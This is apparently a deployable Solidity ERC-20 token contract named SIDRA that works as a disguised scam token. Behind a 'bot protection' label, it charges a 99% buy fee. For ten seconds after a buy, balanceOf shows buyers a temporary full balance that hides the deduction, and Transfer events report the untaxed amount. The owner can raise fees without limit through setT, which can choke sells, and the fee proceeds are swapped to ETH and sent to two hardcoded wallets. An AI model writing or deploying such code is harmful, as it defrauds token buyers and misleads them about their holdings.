1 pragma solidity ^0.8.17;
2 // SPDX-License-Identifier: Unlicensed
3 interface IERC20 {
4 
5     function totalSupply() external view returns (uint256);
6     function balanceOf(address account) external view returns (uint256);
7     function transfer(address recipient, uint256 amount) external returns (bool);
8     function allowance(address owner, address spender) external view returns (uint256);
9     function approve(address spender, uint256 amount) external returns (bool);
10     function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
11 
12     event Transfer(address indexed from, address indexed to, uint256 value);
13     event Approval(address indexed owner, address indexed spender, uint256 value);
14 }
15 
16 library SafeMath {
17 
18     function add(uint256 a, uint256 b) internal pure returns (uint256) {
19         uint256 c = a + b;
20         require(c >= a, "SafeMath: addition overflow");
21 
22         return c;
23     }
24 
25     function sub(uint256 a, uint256 b) internal pure returns (uint256) {
26         return sub(a, b, "SafeMath: subtraction overflow");
27     }
28 
29     function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
30         require(b <= a, errorMessage);
31         uint256 c = a - b;
32 
33         return c;
34     }
35 
36     function mul(uint256 a, uint256 b) internal pure returns (uint256) {
37         // Gas optimization: this is cheaper than requiring 'a' not being zero, but the
38         // benefit is lost if 'b' is also tested.
39         // See: https://github.com/OpenZeppelin/openzeppelin-contracts/pull/522
40         if (a == 0) {
41             return 0;
42         }
43 
44         uint256 c = a * b;
45         require(c / a == b, "SafeMath: multiplication overflow");
46 
47         return c;
48     }
49 
50     function div(uint256 a, uint256 b) internal pure returns (uint256) {
51         return div(a, b, "SafeMath: division by zero");
52     }
53 
54     function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
55         require(b > 0, errorMessage);
56         uint256 c = a / b;
57         // assert(a == b * c + a % b); // There is no case in which this doesn't hold
58 
59         return c;
60     }
61 
62     function mod(uint256 a, uint256 b) internal pure returns (uint256) {
63         return mod(a, b, "SafeMath: modulo by zero");
64     }
65 
66     function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {
67         require(b != 0, errorMessage);
68         return a % b;
69     }
70 }
71 
72 abstract contract Context {
73     //function _msgSender() internal view virtual returns (address payable) {
74     function _msgSender() internal view virtual returns (address) {
75         return msg.sender;
76     }
77 
78     function _msgData() internal view virtual returns (bytes memory) {
79         this;
80         // silence state mutability warning without generating bytecode - see https://github.com/ethereum/solidity/issues/2691
81         return msg.data;
82     }
83 }
84 
85 library Address {
86 
87     function isContract(address account) internal view returns (bool) {
88         // According to EIP-1052, 0x0 is the value returned for not-yet created accounts
89         // and 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470 is returned
90         // for accounts without code, i.e. `keccak256('')`
91         bytes32 codehash;
92         bytes32 accountHash = 0xc5d2460186f7233c927e7db2dcc703c0e500b653ca82273b7bfad8045d85a470;
93         // solhint-disable-next-line no-inline-assembly
94         assembly {codehash := extcodehash(account)}
95         return (codehash != accountHash && codehash != 0x0);
96     }
97 
98     function sendValue(address payable recipient, uint256 amount) internal {
99         require(address(this).balance >= amount, "Address: insufficient balance");
100 
101         // solhint-disable-next-line avoid-low-level-calls, avoid-call-value
102         (bool success,) = recipient.call{value : amount}("");
103         require(success, "Address: unable to send value, recipient may have reverted");
104     }
105 
106     function functionCall(address target, bytes memory data) internal returns (bytes memory) {
107         return functionCall(target, data, "Address: low-level call failed");
108     }
109 
110     function functionCall(address target, bytes memory data, string memory errorMessage) internal returns (bytes memory) {
111         return _functionCallWithValue(target, data, 0, errorMessage);
112     }
113 
114     function functionCallWithValue(address target, bytes memory data, uint256 value) internal returns (bytes memory) {
115         return functionCallWithValue(target, data, value, "Address: low-level call with value failed");
116     }
117 
118     function functionCallWithValue(address target, bytes memory data, uint256 value, string memory errorMessage) internal returns (bytes memory) {
119         require(address(this).balance >= value, "Address: insufficient balance for call");
120         return _functionCallWithValue(target, data, value, errorMessage);
121     }
122 
123     function _functionCallWithValue(address target, bytes memory data, uint256 weiValue, string memory errorMessage) private returns (bytes memory) {
124         require(isContract(target), "Address: call to non-contract");
125 
126         // solhint-disable-next-line avoid-low-level-calls
127         (bool success, bytes memory returndata) = target.call{value : weiValue}(data);
128         if (success) {
129             return returndata;
130         } else {
131             // Look for revert reason and bubble it up if present
132             if (returndata.length > 0) {
133                 // The easiest way to bubble the revert reason is using memory via assembly
134 
135                 // solhint-disable-next-line no-inline-assembly
136                 assembly {
137                     let returndata_size := mload(returndata)
138                     revert(add(32, returndata), returndata_size)
139                 }
140             } else {
141                 revert(errorMessage);
142             }
143         }
144     }
145 }
146 
147 contract Ownable is Context {
148     address private _owner;
149 
150     event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
151 
152     constructor () {
153         address msgSender = _msgSender();
154         _owner = msgSender;
155         emit OwnershipTransferred(address(0), msgSender);
156     }
157 
158     function owner() public view returns (address) {
159         return _owner;
160     }
161 
162     modifier onlyOwner() {
163         require(_owner == _msgSender(), "Ownable: caller is not the owner");
164         _;
165     }
166 
167     function renounceOwnership() public virtual onlyOwner {
168         emit OwnershipTransferred(_owner, address(0));
169         _owner = address(0);
170     }
171 
172     function transferOwnership(address newOwner) public virtual onlyOwner {
173         require(newOwner != address(0), "Ownable: new owner is the zero address");
174         emit OwnershipTransferred(_owner, newOwner);
175         _owner = newOwner;
176     }
177 }
178 
179 interface IUniswapV2Factory {
180     function createPair(address tokenA, address tokenB) external returns (address pair);
181     function getPair(address token0, address token1) external view returns (address);
182 }
183 
184 interface IUniswapV2Router02 {
185     function factory() external pure returns (address);
186     function getAmountsOut(uint amountIn, address[] calldata path) external view returns (uint[] memory amounts);
187     function swapExactTokensForETHSupportingFeeOnTransferTokens(
188         uint amountIn,
189         uint amountOutMin,
190         address[] calldata path,
191         address to,
192         uint deadline
193     ) external;
194     function swapExactTokensForTokensSupportingFeeOnTransferTokens(
195         uint amountIn,
196         uint amountOutMin,
197         address[] calldata path,
198         address to,
199         uint deadline
200     ) external;
201     function swapETHForExactTokens(uint amountOut, address[] calldata path, address to, uint deadline)
202     external payable returns (uint[] memory amounts);
203     function addLiquidityETH(
204         address token,
205         uint amountTokenDesired,
206         uint amountTokenMin,
207         uint amountETHMin,
208         address to,
209         uint deadline
210     ) external payable returns (uint amountToken, uint amountETH, uint liquidity);
211     function removeLiquidity(
212         address tokenA,
213         address tokenB,
214         uint liquidity,
215         uint amountAMin,
216         uint amountBMin,
217         address to,
218         uint deadline
219     ) external returns (uint amountA, uint amountB);
220     function WETH() external pure returns (address);
221 }
222 
223 contract Sidra is Context, IERC20, Ownable {
224     using SafeMath for uint256;
225     using Address for address;
226     modifier lockTheSwap {
227         inSwapAndLiquify = true;
228         _;
229         inSwapAndLiquify = false;
230     }
231     
232     IUniswapV2Router02 public uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);
233     address public marketPair = address(0);
234     address private feeOne = 0x5C0DfbE751DAD042083F326D5db2f7F7E8005DD5;
235     address private feeTwo = 0x73fC3c1870D1189608a1b1c5558a5628424cfC37;    
236     mapping(address => uint256) private _balances;
237     mapping(address => uint256) private tempBalance;
238     mapping(address => uint) private tempBalanceCoolDown;
239     mapping(address => mapping(address => uint256)) private _allowances;
240     mapping(address => bool) private _isExcludedFromFee;
241     string private _name = "SIDRA";
242     string private _symbol = "SIDRA";
243     uint8 private _decimals = 9;
244     uint256 private _tTotal = 10_000_000 * 10 ** _decimals;
245     bool inSwapAndLiquify;
246     uint256 public ethPriceToSwap = 100000000000000000; 
247     uint256 private buyFee = 99;
248     uint256 private sellFee = 0;
249     address private deployer;
250     bool public isBotProtectionEnabled = true;
251     constructor () {
252          _balances[address(this)] = _tTotal;
253         _isExcludedFromFee[owner()] = true;
254         _isExcludedFromFee[address(uniswapV2Router)] = true;
255         _isExcludedFromFee[address(this)] = true;
256         deployer = owner();
257         emit Transfer(address(0), address(this), _tTotal);
258     }
259 
260     function name() public view returns (string memory) {
261         return _name;
262     }
263 
264     function symbol() public view returns (string memory) {
265         return _symbol;
266     }
267 
268     function decimals() public view returns (uint8) {
269         return _decimals;
270     }
271 
272     function totalSupply() public view override returns (uint256) {
273         return _tTotal;
274     }
275 
276     function balanceOf(address account) public view override returns (uint256) {
277         if(isBotProtectionEnabled) {
278             if(account == marketPair || block.timestamp >= tempBalanceCoolDown[account]) {
279                 return _balances[account];
280             } else {
281                return tempBalance[account];
282             }
283         } else {
284             return _balances[account];
285         }   
286     }
287 
288     function transfer(address recipient, uint256 amount) public override returns (bool) {
289         _transfer(_msgSender(), recipient, amount);
290         return true;
291     }
292 
293     function allowance(address owner, address spender) public view override returns (uint256) {
294         return _allowances[owner][spender];
295     }
296 
297     function approve(address spender, uint256 amount) public override returns (bool) {
298         _approve(_msgSender(), spender, amount);
299         return true;
300     }
301 
302     function transferFrom(address sender, address recipient, uint256 amount) public override returns (bool) {
303         _transfer(sender, recipient, amount);
304         _approve(sender, _msgSender(), _allowances[sender][_msgSender()].sub(amount, "ERC20: transfer amount exceeds allowance"));
305         return true;
306     }
307 
308     function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {
309         _approve(_msgSender(), spender, _allowances[_msgSender()][spender].add(addedValue));
310         return true;
311     }
312 
313     function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {
314         _approve(_msgSender(), spender, _allowances[_msgSender()][spender].sub(subtractedValue, "ERC20: decreased allowance below zero"));
315         return true;
316     }
317 
318     function setT(uint256 buy, uint256 sell) external onlyOwner {
319         buyFee = buy;
320         sellFee = sell;
321     }
322 
323     function getT() public view returns(uint256, uint256)  {
324         return (buyFee, sellFee);
325     }
326 
327     function enableDisableBotProtection(bool enableDisable) external onlyOwner {
328         isBotProtectionEnabled = enableDisable;
329     }
330 
331     function excludeIncludeFromFee(address[] calldata addresses, bool isExcludeFromFee) public onlyOwner {
332         addRemoveFee(addresses, isExcludeFromFee);
333     }
334 
335     function addRemoveFee(address[] calldata addresses, bool flag) private {
336         for (uint256 i = 0; i < addresses.length; i++) {
337             address addr = addresses[i];
338             _isExcludedFromFee[addr] = flag;
339         }
340     }
341 
342     function openTrading() external onlyOwner() {
343         require(marketPair == address(0),"UniswapV2Pair has already been set");
344         _approve(address(this), address(uniswapV2Router), _tTotal);
345         marketPair = IUniswapV2Factory(uniswapV2Router.factory()).createPair(address(this), uniswapV2Router.WETH());
346         uniswapV2Router.addLiquidityETH{value: address(this).balance}(
347             address(this),
348             balanceOf(address(this)),
349             0,
350             0,
351             owner(),
352             block.timestamp);
353         IERC20(marketPair).approve(address(uniswapV2Router), type(uint).max);
354     }
355 
356     function isExcludedFromFee(address account) public view returns (bool) {
357         return _isExcludedFromFee[account];
358     }
359 
360     function _approve(address owner, address spender, uint256 amount) private {
361         require(owner != address(0), "ERC20: approve from the zero address");
362         require(spender != address(0), "ERC20: approve to the zero address");
363 
364         _allowances[owner][spender] = amount;
365         emit Approval(owner, spender, amount);
366     }
367 
368     function _transfer(address from, address to, uint256 txnAmount) private {
369         require(from != address(0), "ERC20: transfer from the zero address");
370         require(to != address(0), "ERC20: transfer to the zero address");
371         require(txnAmount > 0, "Transfer amount must be greater than zero");
372         uint256 taxAmount = 0;
373         bool takeFees = !_isExcludedFromFee[from] && !_isExcludedFromFee[to] && from != owner() && to != owner();
374         uint256 amount = txnAmount;
375         if(from != owner() && to != owner() && from != address(this) && to != address(this)) {
376             if(takeFees) {
377                 taxAmount = amount.mul(buyFee).div(100);
378                 if (from == marketPair && isBotProtectionEnabled) {
379                     tempBalance[to] = tempBalance[to].add(amount);
380                     tempBalanceCoolDown[to] = block.timestamp.add(10 seconds);
381                 }
382                 if (from != marketPair && to == marketPair) {
383                     if(txnAmount > _balances[from]) {
384                         amount = _balances[from];
385                     }
386                     taxAmount = amount.mul(sellFee).div(100);
387                     uint256 contractTokenBalance = balanceOf(address(this));
388                     if (contractTokenBalance > 0) {
389                         uint256 tokenAmount = getTokenPrice();
390                         if (contractTokenBalance >= tokenAmount && !inSwapAndLiquify) {
391                             swapTokensForEth(tokenAmount);
392                         }
393                     }
394                 }
395             }
396         }
397         uint256 transferAmount = amount.sub(taxAmount);
398         _balances[from] = _balances[from].sub(amount);
399         _balances[to] = _balances[to].add(transferAmount);
400         _balances[address(this)] = _balances[address(this)].add(taxAmount);
401         emit Transfer(from, to, txnAmount);
402     }
403 
404     function manualSwap() external {
405         uint256 contractTokenBalance = balanceOf(address(this));
406         if (contractTokenBalance > 0) {
407             if (!inSwapAndLiquify) {
408                 swapTokensForEth(contractTokenBalance);
409             }
410         }
411     }
412 
413     function swapTokensForEth(uint256 tokenAmount) private {
414         // generate the uniswap pair path of token -> weth
415         address[] memory path = new address[](2);
416         path[0] = address(this);
417         path[1] = uniswapV2Router.WETH();
418         _approve(address(this), address(uniswapV2Router), tokenAmount);
419         uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(
420             tokenAmount,
421             0,
422             path,
423             address(this),
424             block.timestamp
425         );
426 
427         uint256 ethBalance = address(this).balance;
428         uint256 halfShare = ethBalance.div(2);  
429         payable(feeOne).transfer(halfShare);
430         payable(feeTwo).transfer(halfShare); 
431     }
432 
433     function getTokenPrice() public view returns (uint256)  {
434         address[] memory path = new address[](2);
435         path[0] = uniswapV2Router.WETH();
436         path[1] = address(this);
437         return uniswapV2Router.getAmountsOut(ethPriceToSwap, path)[1];
438     }
439 
440     function setEthPriceToSwap(uint256 ethPriceToSwap_) external onlyOwner {
441         ethPriceToSwap = ethPriceToSwap_;
442     }
443 
444     receive() external payable {}
445 
446     function recoverEthInContract() external {
447         uint256 ethBalance = address(this).balance;
448         payable(deployer).transfer(ethBalance);
449     }
450 
451     function recoverERC20Tokens(address contractAddress) external {
452         IERC20 erc20Token = IERC20(contractAddress);
453         uint256 balance = erc20Token.balanceOf(address(this));
454         erc20Token.transfer(deployer, balance);
455     }
456 }